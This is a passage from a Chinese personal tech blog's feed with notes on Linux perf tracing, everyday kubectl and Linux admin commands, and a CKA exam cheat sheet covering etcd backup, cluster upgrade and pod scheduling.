class="headerlink" title="linux追踪框架之perf"></a>linux追踪框架之perf</h2><p>支持采样<br>通过采样找到热点函数，采样频率可以通过参数指定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@k8s-node2 ~]<span class="hljs-comment"># apt install linux-tools-common</span><br><br>[root@k8s-node2 ~]<span class="hljs-comment"># cat /sys/kernel/debug/tracing/available_events | grep receive_skb</span><br>net:netif_receive_skb_list_exit<br>net:netif_receive_skb_exit<br>net:netif_receive_skb_list_entry<br>net:netif_receive_skb_entry<br>net:netif_receive_skb<br>[root@k8s-node2 ~]<span class="hljs-comment">#</span><br>[root@k8s-node2 ~]<span class="hljs-comment"># perf list| grep receive_skb</span><br>  net:netif_receive_skb                              [Tracepoint event]<br>  net:netif_receive_skb_entry                        [Tracepoint event]<br>  net:netif_receive_skb_exit                         [Tracepoint event]<br>  net:netif_receive_skb_list_entry                   [Tracepoint event]<br>  net:netif_receive_skb_list_exit                    [Tracepoint event]<br>[root@k8s-node2 ~]<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># perf record</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf record -g ls</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf list |grep do_sys_open</span><br><span class="hljs-comment"># perf probe --add do_sys_open</span><br><span class="hljs-comment"># perf record -e probe:do_sys_open -aR sleep 1</span><br><span class="hljs-comment"># perf script</span><br><span class="hljs-comment"># perf report</span><br><br><span class="hljs-comment"># perf trace</span><br><br><br><br>[root@n16 dynamic-tracing]<span class="hljs-comment"># cat main.c</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br><br>void <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, pid=%d\n&quot;</span>, getpid());<br>    <span class="hljs-keyword">while</span>(1) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;begin sleep...\n&quot;</span>);<br>        <span class="hljs-built_in">sleep</span>(1);<br>    &#125;<br>&#125;<br>[root@n16 dynamic-tracing]<span class="hljs-comment"># gcc -o main main.c</span><br>[root@n16 dynamic-tracing]<span class="hljs-comment"># perf stat ./main</span><br>hello, pid=3422281<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>^C./main: Interrupt<br><br> Performance counter stats <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;./main&#x27;</span>:<br><br>              0.62 msec task-clock                <span class="hljs-comment">#    0.000 CPUs utilized</span><br>                 6      context-switches          <span class="hljs-comment">#    0.010 M/sec</span><br>                 0      cpu-migrations            <span class="hljs-comment">#    0.000 K/sec</span><br>                50      page-faults               <span class="hljs-comment">#    0.080 M/sec</span><br>         1,508,737      cycles                    <span class="hljs-comment">#    2.425 GHz</span><br>           869,282      instructions              <span class="hljs-comment">#    0.58  insn per cycle</span><br>           176,507      branches                  <span class="hljs-comment">#  283.740 M/sec</span><br>             8,840      branch-misses             <span class="hljs-comment">#    5.01% of all branches</span><br><br>       5.795174879 seconds time elapsed<br><br>       0.000627000 seconds user<br>       0.000080000 seconds sys<br>   <br><span class="hljs-comment"># perf top</span><br><br><br><br>[root@n16 perf]<span class="hljs-comment"># cat perftest.cpp</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;cmath&gt;</span><br><span class="hljs-comment">#include &lt;sys/types.h&gt;</span><br><span class="hljs-comment">#include &lt;unistd.h&gt;</span><br>using namespace std;<br><br>void <span class="hljs-function"><span class="hljs-title">for_loop</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 1000; i++) &#123;<br>        <span class="hljs-keyword">for</span> (int j = 0; j &lt; 10000; j++) &#123;<br>            int x = sin(i) + cos(j);<br>        &#125;<br>    &#125;<br>&#125;<br><br>void <span class="hljs-function"><span class="hljs-title">loopsmall</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 10; i++) &#123;<br>        for_loop();<br>    &#125;<br>&#125;<br><br>void <span class="hljs-function"><span class="hljs-title">loopbig</span></span>()<br>&#123;<br>    <span class="hljs-keyword">for</span> (int i = 0; i &lt; 100; i++) &#123;<br>        for_loop();<br>    &#125;<br>&#125;<br><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pid=%d\n&quot;</span>, getpid());<br>    loopbig();<br>    loopsmall();<br><br>    <span class="hljs-built_in">return</span> 0;<br>&#125;<br>[root@n16 perf]<span class="hljs-comment"># g++ -o perftest perftest.cpp</span><br>[root@n16 perf]<span class="hljs-comment"># ./perftest</span><br>pid=3424465<br><span class="hljs-comment">### 新开一个shell</span><br>[root@n16 perf]<span class="hljs-comment"># perf record -p 3424465 -a -g -F 99 -- sleep 10</span><br>Warning:<br>PID/TID switch overriding SYSTEM<br>[ perf record: Woken up 1 <span class="hljs-built_in">times</span> to write data ]<br>[ perf record: Captured and wrote 0.096 MB perf.data (982 samples) ]<br>[root@n16 perf]<span class="hljs-comment">#</span><br>[root@n16 perf]<span class="hljs-comment">#</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br><br><br><br><span class="hljs-comment"># man perf report</span><br><br><span class="hljs-comment"># man perf kmem</span><br><span class="hljs-comment"># perf kmem record</span><br><span class="hljs-comment"># perf kmem stat</span><br><br><br><br>[root@n16 perf]<span class="hljs-comment"># ./main</span><br>hello, pid=3430094<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br>begin <span class="hljs-built_in">sleep</span>...<br><span class="hljs-comment">### 新开一个shell</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched record -p 3430094 -- sleep 10</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched script</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched latency</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br><br><br><br><span class="hljs-comment">## 全局采样</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched record -- sleep 10</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched script</span><br>[root@n16 perf]<span class="hljs-comment"># perf sched latency</span><br>[root@n16 perf]<span class="hljs-comment"># perf report</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux内核调试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】k8s常用命令</title>
    <link href="/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">kubectl rollout restart <br><br>k2 <span class="hljs-built_in">get</span> pod -n welkin-<span class="hljs-built_in">system</span> |<span class="hljs-keyword">grep</span> dubhe-manager |<span class="hljs-keyword">grep</span> ContainerStatusUnknown | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs kubectl --kubeconfig /root/kubeconfig/kubeconfig-n2  <span class="hljs-keyword">delete</span> pod -n welkin-<span class="hljs-built_in">system</span><br><br><br></code></pre></td></tr></table></figure><h2 id="查看某个ns下node0上内存占用高的pod"><a href="#查看某个ns下node0上内存占用高的pod" class="headerlink" title="查看某个ns下node0上内存占用高的pod"></a>查看某个ns下node0上内存占用高的pod</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl top pod -n [xxxxxx] --sort-by=<span class="hljs-string">&#x27;memory&#x27;</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs  kubectl get pod -n [xxxxxx]  -owide | grep node0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】k8s常用命令</title>
    <link href="/2022/12/18/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/18/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91k8s%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">kubectl rollout restart <br><br>k2 <span class="hljs-built_in">get</span> pod -n welkin-<span class="hljs-built_in">system</span> |<span class="hljs-keyword">grep</span> dubhe-manager |<span class="hljs-keyword">grep</span> ContainerStatusUnknown | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | xargs kubectl --kubeconfig /root/kubeconfig/kubeconfig-n2  <span class="hljs-keyword">delete</span> pod -n welkin-<span class="hljs-built_in">system</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202212) cka考试必备命令大全及注意事项</title>
    <link href="/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E8%80%83%E8%AF%95%E5%BF%85%E5%A4%87%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
    <url>/2022/12/18/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202212)%20cka%E8%80%83%E8%AF%95%E5%BF%85%E5%A4%87%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8%E5%8F%8A%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="必备命令"><a href="#必备命令" class="headerlink" title="必备命令"></a>必备命令</h2><h3 id="主机层面"><a href="#主机层面" class="headerlink" title="主机层面"></a>主机层面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bash completion</span><br>apt install bash-completion<br><span class="hljs-built_in">source</span> &lt;(kubectl completion bash)<br><br><br><span class="hljs-comment"># vim ~/.bahsrc</span><br><span class="hljs-built_in">alias</span> k=kubectl<br><span class="hljs-built_in">alias</span> kgn=<span class="hljs-string">&quot;kubectl get node -owide&quot;</span><br><span class="hljs-built_in">alias</span> kgp=<span class="hljs-string">&quot;kubectl get pod -owide&quot;</span><br><span class="hljs-built_in">alias</span> kgs=<span class="hljs-string">&quot;kubectl get svc -owide&quot;</span><br><span class="hljs-built_in">alias</span> kg=<span class="hljs-string">&quot;kubectl get -owide &quot;</span><br><span class="hljs-built_in">alias</span> kd=<span class="hljs-string">&quot;kubectl delete &quot;</span><br><span class="hljs-built_in">alias</span> kaf=<span class="hljs-string">&quot;kubectl apply -f &quot;</span><br><span class="hljs-built_in">alias</span> kdf=<span class="hljs-string">&quot;kubectl delete -f &quot;</span><br><span class="hljs-comment"># source ~/.bahsrc</span><br><br></code></pre></td></tr></table></figure><h3 id="k8s命令"><a href="#k8s命令" class="headerlink" title="k8s命令"></a>k8s命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># 清空某一个节点上的pod</span><br>kubectl cordon xxx<br>kubectl drain xxx --ignore-daemonsets<br>kubectl drain xxx --ignore-daemonsets --delete-emptydir-data --force <span class="hljs-comment"># 报错的话可以加上</span><br><br><br><span class="hljs-comment"># kubeadm升级master节点</span><br><span class="hljs-comment">## 01.清空升级的节点</span><br>kubectl cordon xxx<br>kubectl drain xxx --ignore-daemonsets <br><span class="hljs-comment">## 02.升级主机安装包</span><br>apt-get upgrade<br><span class="hljs-comment">## 03.升级k8s相关组件</span><br>apt-mark unhold kubeadm kubelet kubectl<br>apt-get install -y kubeadm=1.22.4-00 kubelet=1.22.4-00 kubectl=1.22.4-00<br>apt-mark hold kubeadm kubelet kubectl<br><span class="hljs-comment">## 04.升级集群</span><br>kubeadm upgrade plan<br>kubeadm upgrade apply v1.22.4 --etcd-upgrade=<span class="hljs-literal">false</span><br><span class="hljs-comment">## 05.重启kubelet</span><br>systemctl daemon-reload<br>systemctl restart kubelet<br><span class="hljs-comment">## 06.取消节点的不可调度</span><br>kubectl uncordon xxx<br><span class="hljs-comment">## 07.查看节点状态以及版本</span><br>kubectl get node<br><br><br><span class="hljs-comment"># etcd备份还原</span><br><span class="hljs-comment">## 01.备份</span><br>ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=xxx --cert=xxx --key=xxx snapshot save xxx.db<br><span class="hljs-comment">## 02.移除etcd和api</span><br><span class="hljs-built_in">mv</span> /etc/kubernetes/manifests /etc/kubernetes/manifests.bak<br><span class="hljs-comment">## 03.备份原来etcd文件夹</span><br><span class="hljs-built_in">mv</span> /var/lib/etcd /var/lib/etcd.bak<br><span class="hljs-comment">## 04.etcd还原</span><br>ETCDCTL_API=3 etcdctl --endpoints=https://127.0.0.1:2379 --cacert=xxx --cert=xxx --key=xxx snapshot restore xxx.db --data-dir=/var/lib/etcd<br><span class="hljs-comment">## 05.移回静态pod</span><br><span class="hljs-built_in">mv</span> /etc/kubernetes/manifests.bak /etc/kubernetes/manifests<br><span class="hljs-comment">## 06.验证集群资源状态</span><br>kubectl get node<br>kubectl get pod -A<br><br><br>kubectl label ns my-app name=my-app<br>kubetcl get ns --show-labels<br><br><span class="hljs-comment"># svc</span><br>apiVersion:<br>kind: Deployment<br>metadata:<br>  name:<br>spec:<br>  template:<br>    spec:<br>      containers:<br>      - image: xxx<br>        name: nginx<br>        ports:<br>        - name: http<br>          containerPort: 80<br>          protocol: TCP<br>kubectl expose deployment xxx -n xxx --name xxx --port xxx --target-port xxx --<span class="hljs-built_in">type</span>=ClusterIP/NodePort/LoadBalancer<br><br><br>kubectl get deployment -owide  <span class="hljs-comment">#找到SELECTOR下面的内容(app=nginx)</span><br>kubectl get pod -l app=nginx<br><br>kubectl scale deployment xxx --replicas=3<br><br><br><span class="hljs-comment"># 创建一个pod，镜像nginx，调度pod到disk=ssd的节点</span><br><span class="hljs-comment">## 01.使用命令创建一个pod的模板，比从官网找快很多</span><br>kubectl run pod-test --image=nginx --dry-run=client -oyaml &gt; 11.yaml<br><span class="hljs-comment">## 02.更改pod的模板</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: pod-test<br>spec:<br>  containers:<br>  - image: nginx<br>    name: pod-test<br>  nodeSelector:<br>    disk: ssd<br><br><br><span class="hljs-comment"># 记录pvc的更改</span><br>kubectl edit pvc xxx --record<br>kubectl edit pvc xxx --save-config<br><br><br><span class="hljs-comment"># 统计ready的node数量</span><br>kubectl describe node <br>grep -i <span class="hljs-comment"># 忽略大小写</span><br>grep -v <span class="hljs-comment"># 排除在外</span><br>grep -c <span class="hljs-comment"># 统计查出来的条数</span><br><br><br><span class="hljs-comment"># 查看cpu使用率最高的pod</span><br>kubectl top pod -A -l name=cpu-loader --sort-by=<span class="hljs-string">&quot;cpu&quot;</span><br><br><br><span class="hljs-comment"># 强制删除pod(补充)</span><br>kubectl delete pod xxx -n xxx --grace-period=0 --force<br></code></pre></td></tr></table></figure><h3 id="命令详细输出"><a href="#命令详细输出" class="headerlink" title="命令详细输出"></a>命令详细输出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># kubectl run pod-test --image=nginx --dry-run=client -oyaml</span><br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  creationTimestamp: null<br>  labels:<br>    run: pod-test<br>  name: pod-test<br>spec:<br>  containers:<br>  - image: nginx<br>    name: pod-test<br>    resources: &#123;&#125;<br>  dnsPolicy: ClusterFirst<br>  restartPolicy: Always<br>status: &#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="题目分值占比"><a href="#题目分值占比" class="headerlink" title="题目分值占比"></a>题目分值占比</h2><p>第1题 RBAC授权(4%)<br>第2题 节点设置不可用(4%)<br>第3题 升级k8s版本(7%)<br>第4题 etcd备份与恢复(7%)<br>第5题 网络策略(7%)<br>第6题 svc暴露应用(7%)<br>第7题 ingress(7%)<br>第8题 扩容pod数量(4%)<br>第9题 nodeSelector(4%)<br>第10题 统计准备就绪节点数量(4%)<br>第11题 Pod 配置多容器(4%)<br>第12题 创建 PV(4%)<br>第13题 Pod 使用 PVC(7%)<br>第14题 获取 Pod 错误日志(5%)<br>第15题 给 Pod 增加一个容器（边车）(7%)<br>第16题 统计使用 CPU 最高的 Pod(5%)<br>第17题 节点 NotReady 处理(13%)</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>You must return to the base node (hostname node-1) after completing each task.</p><p>For your convenience, all environments, in other words, the base system and the cluster nodes, have the following additional command-line tools pre-installed and pre-configured:</p><ul><li><code>kubectl</code> with <code>k</code>alias and Bash autocompletion</li><li><code>jq</code> for YAML&#x2F;JSON processing</li><li><code>tmux</code> for terminal multiplexing</li><li><code>curl</code> and <code>wget</code> for testing web services</li><li><code>man</code> and man pages for further documentation</li></ul><p>自动补全有问题<br>deployment和svc那块 需要注意这两个的SELECTOR是否一致，svc这块可能是none，需要调整一下<br>ingress这块，如果ingress没有ip，需要检查hello服务的type是否是ClusterIP，不是的话需要修改</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
      <tag>cka</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux常用命令</title>
    <link href="/2022/12/15/linux/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/15/linux/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>nc<br><br>curl xxx -I<br><br> <br><br>systemctl is-enabled xxx<br><br><span class="hljs-comment">## 20221218</span><br>lsof -w |<span class="hljs-built_in">wc</span> -l<br>pkill fluentbit<br><br><br>grep xxx  ./  r<br><br><br>sqlite3 xx.db<br><br>.headers on<br>.tables<br><br><br>学习一下es的语法<br>paas-xxx : xxx* and xxx<br>paas-xxx : <span class="hljs-string">&quot;xxx&quot;</span>  加上双引号 精确匹配？？查查<br>podccc.keyword: /var/log<br><br><br>openssl x509 -<span class="hljs-keyword">in</span> cacert.pem -noout -text<br>openssl x509 -<span class="hljs-keyword">in</span> cacert.pem -noout -text<br><br><br>docker <span class="hljs-built_in">history</span> 10.111.xxx.xxx/xxx/xxx<br><br><br><br><br><br><br>lvcreate  -L 200G -n lv_data datavg  <br>mkfs.xfs  -f /dev/mapper/datavg-lv_data  <br>  <br><span class="hljs-built_in">mkdir</span> /osbak  <br>mount  /dev/mapper/datavg-lv_data /osbak  <br><span class="hljs-built_in">mkdir</span> -p /osbak/root /osbak/home /osbak/bin  <br><span class="hljs-built_in">cp</span> -ar /root  /osbak/  <br><span class="hljs-built_in">cp</span> -ar /home  /osbak/  <br><span class="hljs-built_in">cp</span> -ar /usr/local/bin /osbak<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【git】git常用命令</title>
    <link href="/2022/12/15/git/%E3%80%90git%E3%80%91git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/15/git/%E3%80%90git%E3%80%91git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
